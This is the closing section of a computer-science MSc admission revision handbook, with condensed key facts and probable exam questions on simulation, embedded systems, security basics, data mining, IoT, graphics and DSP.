## ⚡ One-Minute Recap

- Simulation: imitate real system using computer model
- Discrete event: state changes at events (arrival, departure)
- Monte Carlo: use random numbers for probabilistic estimation
- LCG: pseudo-random number generator xₙ₊₁ = (axₙ+c) mod m
- Verification: correct implementation | Validation: correct model

---

## 📝 Probable Exam Questions

> **5-mark:** Explain Monte Carlo simulation. Show how to estimate π using it.
> **Short note:** What is discrete event simulation? Give an example.
> **Explain:** What is a Linear Congruential Generator? Generate 5 values with given parameters.
> **Distinguish:** Verification vs validation in simulation.

---

---

# 🏁 Tier C Master Quick Revision Sheet

## ⚡ Subject-by-Subject Key Facts

### Subject 14 — Embedded Systems
```
Embedded system: dedicated, real-time, resource-constrained
8086: 16-bit, 20-bit address bus, 1MB memory, segment:offset
Interrupt: pause CPU → ISR → resume
I2C: 2 wires, addressed, slower | SPI: 4 wires, SS select, faster
MCU = CPU + RAM + Flash + I/O on one chip
```

### Subject 15 — Security & Cryptography
```
CIA: Confidentiality, Integrity, Availability
SQL injection: malicious SQL in input → parameterized queries
XSS: malicious JS in page → encode output, CSP
AES: symmetric, fast | RSA: asymmetric, slow
Hash: one-way, fixed output | Digital signature: private key signs
```

### Subject 16 — Data Mining & Warehousing
```
Apriori: frequent itemsets → association rules
  Support = P(X) | Confidence = P(Y|X) | Lift = Conf/Support(Y)
K-means: assign to nearest centroid, update centroids, repeat
OLTP: transactions, current | OLAP: analysis, historical
Star schema: fact table + dimension tables
```

### Subject 17 — IoT
```
IoT: physical devices connected to internet
4 layers: Perception → Network → Middleware → Application
Protocols: WiFi (high power), BLE (low power), LoRa (long range)
Edge computing: process locally, reduce latency
Challenges: security, privacy, interoperability
```

### Subject 18 — Computer Graphics
```
Translation: add | Scaling: multiply | Rotation: trig
DDA: floating-point line drawing
Bresenham: integer-only, faster
Clipping: Cohen-Sutherland (4-bit region codes)
Homogeneous coordinates: all transforms as matrix multiplication
```

### Subject 19 — DSP & Image Processing
```
Nyquist: sample at ≥ 2× max frequency
Aliasing: sampling too slow → distortion
Histogram equalization: redistribute pixel intensities
Spatial filtering: apply kernel to each pixel
JPEG: lossy, DCT on 8×8 blocks
```

### Subject 20 — Simulation & Modeling
```
Discrete event: state changes at events
Monte Carlo: random sampling for probabilistic estimation
LCG: xₙ₊₁ = (axₙ+c) mod m
Verification: correct code | Validation: correct model
π estimate: 4 × (points in circle) / total points
```

---

## 🎯 Most Likely Tier C Exam Questions

1. CIA triad — explain with examples of attacks
2. SQL injection — what it is and how to prevent
3. AES vs RSA comparison
4. Apriori algorithm — support and confidence calculation
5. K-means clustering — algorithm and example
6. OLTP vs OLAP comparison
7. Bresenham's line algorithm — trace
8. Nyquist sampling theorem — what is aliasing?
9. Monte Carlo simulation — estimate π
10. Discrete event simulation — explain with bank queue example

---

> 🎉 **COMPLETE HANDBOOK — ALL 20 SUBJECTS DONE!**
>
> **Tier S (01-06):** DSA, OS, Networks, Compiler Design, Digital Logic, Software Engineering
> **Tier A (07-10):** DBMS, AI/ML, OOP, Programming Fundamentals
> **Tier B (11-13):** Discrete Math, Computer Architecture, Numerical Analysis
> **Tier C (14-20):** Embedded Systems, Security, Data Mining, IoT, Graphics, DSP, Simulation

---

*MSc Admission Preparation Handbook — Complete Edition*
*JUST-Style Exam Focus | All 20 Subjects Covered*
